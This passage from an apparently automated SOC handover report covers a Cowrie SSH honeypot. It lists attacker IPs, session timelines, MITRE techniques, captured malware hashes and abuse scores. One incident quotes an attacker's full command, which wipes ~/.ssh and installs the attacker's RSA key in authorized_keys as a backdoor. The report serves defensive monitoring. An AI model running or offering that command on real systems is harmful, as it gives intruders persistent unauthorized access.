- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd0bc9d13b9

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]101` |
| **First Seen** | 2026-04-12 18:30 |
| **Last Seen** | 2026-04-12 18:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:30:18` | `cowrie.session.connect` |
| `2026-04-12 18:30:18` | `cowrie.client.version` |
| `2026-04-12 18:30:18` | `cowrie.client.kex` |
| `2026-04-12 18:30:19` | `cowrie.login.success` |
| `2026-04-12 18:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]101` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26dbae368784

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:34 |
| **Last Seen** | 2026-04-12 18:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:34:02` | `cowrie.session.connect` |
| `2026-04-12 18:34:02` | `cowrie.client.version` |
| `2026-04-12 18:34:02` | `cowrie.client.kex` |
| `2026-04-12 18:34:03` | `cowrie.login.success` |
| `2026-04-12 18:34:03` | `cowrie.session.params` |
| `2026-04-12 18:34:03` | `cowrie.command.input` |
| `2026-04-12 18:34:03` | `cowrie.command.failed` |
| `2026-04-12 18:34:03` | `cowrie.log.closed` |
| `2026-04-12 18:34:04` | `cowrie.session.params` |
| `2026-04-12 18:34:04` | `cowrie.command.input` |
| `2026-04-12 18:34:04` | `cowrie.session.file_download` |
| `2026-04-12 18:34:04` | `cowrie.log.closed` |
| `2026-04-12 18:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09414dfa85df

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:34 |
| **Last Seen** | 2026-04-12 18:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:34:06` | `cowrie.session.connect` |
| `2026-04-12 18:34:06` | `cowrie.client.version` |
| `2026-04-12 18:34:06` | `cowrie.client.kex` |
| `2026-04-12 18:34:07` | `cowrie.login.success` |
| `2026-04-12 18:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.151.178[.]49` | **9** | 2026-04-12 18:22 | 2026-04-12 18:42 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `58.186.20[.]101` | **3** | 2026-04-12 18:23 | 2026-04-12 18:30 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | **2** | 2026-04-12 18:06 | 2026-04-12 18:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]169` | **2** | 2026-04-12 17:56 | 2026-04-12 17:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.171.69[.]82` | 1 | 2026-04-12 17:09 | 2026-04-12 17:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.69[.]159` | 1 | 2026-04-12 17:15 | 2026-04-12 17:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.35.184[.]213` | 1 | 2026-04-12 17:51 | 2026-04-12 17:52 | 14s | 0 | `T1592` | 🟢 LOW |
| `114.35.59[.]237` | 1 | 2026-04-12 18:23 | 2026-04-12 18:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.73[.]14` | 1 | 2026-04-12 18:29 | 2026-04-12 18:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.135.44[.]141` | 1 | 2026-04-12 18:34 | 2026-04-12 18:34 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]152` | 1 | 2026-04-12 18:29 | 2026-04-12 18:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-04-12 16:36 | 2026-04-12 16:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.115.183[.]206` | 1 | 2026-04-12 18:24 | 2026-04-12 18:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.121.200[.]75` | 1 | 2026-04-12 18:25 | 2026-04-12 18:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.79.94[.]12` | 1 | 2026-04-12 18:16 | 2026-04-12 18:16 | 12s | 0 | `T1592` | 🟢 LOW |
| `83.171.89[.]209` | 1 | 2026-04-12 18:25 | 2026-04-12 18:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `40.121.200[.]75` | US | Microsoft Corporation | **100** ⚠️ | 20 |
| `114.35.184[.]213` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 7 |
| `20.64.105[.]169` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `118.196.73[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `58.186.20[.]101` | VN | FPT Telecom Company | **100** ⚠️ | 29 |
| `106.13.69[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `112.151.178[.]49` | KR | LG POWERCOMM | **100** ⚠️ | 13 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `61.79.94[.]12` | KR | Korea Telecom | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 37 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 33 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 16 recon entry/entries in table (4 group(s) consolidating 16 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T18:44:04Z_
